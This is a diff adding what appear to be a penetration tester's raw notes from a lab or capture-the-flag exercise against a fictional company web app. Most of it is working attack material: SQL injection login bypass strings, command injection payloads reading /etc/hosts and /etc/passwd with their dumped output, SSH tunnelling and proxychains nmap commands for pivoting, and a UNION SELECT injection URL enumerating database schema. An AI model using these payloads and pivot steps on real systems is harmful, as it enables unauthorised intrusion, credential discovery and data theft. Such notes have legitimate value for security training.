@@ -1,0 +1,135 @@
+CEO - Charlie Chaplann 
+CChaplann@UniversalExports.com
+
+
+username : ' OR 1='1
+password : ' OR 1='1
+
+took me to an Admin Page with a "Decode string" field
+
+; cat /etc/hosts
+
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+192.168.28.175 BestWebApp
+
+; cat /etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
+ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash
+user2:x:1002:1003::/home/user2:/bin/sh
+
+USERS WITH SHELLS !!!
+root:x:0:0:root:/root:/bin/bash
+www-data:x:33:33:www-data:/var/www:/bin/sh
+ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash
+user2:x:1002:1003::/home/user2:/bin/sh
+
+
+whoami 
+
+www-data
+
+; ls -latr & netstat -rn
+
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
+0.0.0.0         10.10.28.1      0.0.0.0         UG        0 0          0 ens192
+10.10.28.0      0.0.0.0         255.255.255.224 U         0 0          0 ens192
+total 108
+-rw-rw-rw- 1 root root      1503 Mar  5  2025 admin.php
+-rw-rw-rw- 1 root root       215 Mar  5  2025 logout.php
+-rw-rw-rw- 1 root root      1425 Mar  5  2025 login.php
+-rw-rw-rw- 1 root root       951 Mar  5  2025 login.html
+-rw-rw-rw- 1 root root     24939 Mar  5  2025 letterfromceo.pdf
+-rw-rw-rw- 1 root root      1077 Mar  5  2025 index.html
+-rw-rw-rw- 1 root root       475 Mar  5  2025 getcareers.php
+-rw-rw-rw- 1 root root       744 Mar  5  2025 contact.html
+-rw-rw-rw- 1 root root       917 Mar  5  2025 careers.html
+-rw-rw-rw- 1 root root       846 Mar  5  2025 apply.html
+-rw-rw-rw- 1 root root       361 Mar  5  2025 upload.php
+-rw-rw-rw- 1 root root       429 Mar  5  2025 status.php
+-rw-rw-rw- 1 root root       572 Mar  5  2025 software.php
+-rw-rw-rw- 1 root root       791 Mar  5  2025 site.css
+-rw-rw-rw- 1 root root       742 Mar  5  2025 secureServ.php
+drwxrwxrwx 2 root root      4096 Mar  5  2025 careers
+drwxrwxrwx 2 root root      4096 Mar  5  2025 sw
+drwxrwxrwx 2 root root      4096 Mar  5  2025 img
+drwxrwxr-x 3 root www-data  4096 Mar 13  2025 ..
+drwxr-xr-x 6 root root      4096 Feb 13 15:35 .
+drwxrwxrwx 2 root root      4096 Feb 13 15:35 scripts
+
+status.php gives me 
+
+Welcome Aaron! Your id is: 0
+Logout Aaron
+
+
+ssh key upload
+
+authenticate to www-data
+
+dynamic tunnel
+proxychains nmap --script=http-enum 192.168.28.175
+
+
+Nmap scan report for 192.168.28.175
+Host is up (0.0017s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE
+2222/tcp open  EtherNetIP-1
+8000/tcp open  http-alt
+
+ssh -S /tmp/jmp jmp -O forward -L 21631:192.168.28.175:2222
+ssh -S /tmp/jmp jmp -O forward -L 21632:192.168.28.175:8000
+------ > 
+(this looks like a place for SQL)
+Product Selection
+
+Monitors
+Mouse
+Cat5
+CAT5e
+Speakers
+Tablets
+HAM
+Fiber
+
+pretty sure i clicked on HAM
+
+injected a golden statement
+
+http://127.0.0.1:21632/pick.php?product=7%20UNION%20SELECT%20Table_schema,Column_name,table_name%20FROM%20Information_schema.columns
